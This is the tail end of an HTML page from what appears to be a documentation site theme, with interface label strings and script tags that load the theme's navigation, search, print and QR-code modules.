    <i class="fa-solid fa-angles-right fa-lg"></i>
  </div>
</div>
</div>
</div><script type='text/javascript'>
  const baseUrl = 'https:\/\/example.org\/';
  const codeCopyBefore = 'Copy to clipboard';
  const codeCopyAfter = 'Copied to clipboard';
  const svgDownloadLabel = 'Download as SVG';
  const helperLoadingLabel = 'Loading';
  const searchNoResults = 'No result found';
  const introNextLabel = 'Next';
  const introPrevLabel = 'Previous';
  const introSkipLabel = '✗';
  const introDoneLabel = 'Done';
  const printLabel = 'Print current page';
  const qrCodeLabel = 'Show current page QR code';
  const naCommonLabel = 'Not available';
</script>
<script
      type="module"
      src="/js/theme/modules/const.min.js"
    ></script><script
      type="module"
      src="/js/theme/modules/helpers.min.js"
    ></script><script
      type="module"
      src="/js/theme/modules/helpersGlobal.min.js"
    ></script><script
      type="module"
      src="/js/theme/init.min.js"
    ></script><script
      type="module"
      src="/js/theme/navbar.min.js"
    ></script><script
      type="module"
      src="/js/theme/print.min.js"
    ></script><script
      type="module"
      src="/js/theme/qrcode.min.js"
    ></script><script
      type="module"
      src="/js/theme/search.min.js"
    ></script><script
      type="module"
      src="/js/theme/shortcuts.min.js"
    ></script><script
      type="module"
      src="/js/theme/sidebar.min.js"
    ></script><script
      type="module"
      src="/js/theme/toc.min.js"
    ></script><script
      type="text/javascript"
      src="/js/theme/browserCompatibility.min.js"
    ></script><script
      type="text/javascript"
      src="/js/external/flexsearch/flexsearch.bundle.min.js"
    ></script><script
      type="text/javascript"
      src="/js/external/qrious/qrious.min.js"
    ></script><script
      type="text/javascript"
      src="/js/external/overlay-scrollbars/overlayscrollbars.min.js"
    ></script>
</body>
</html>
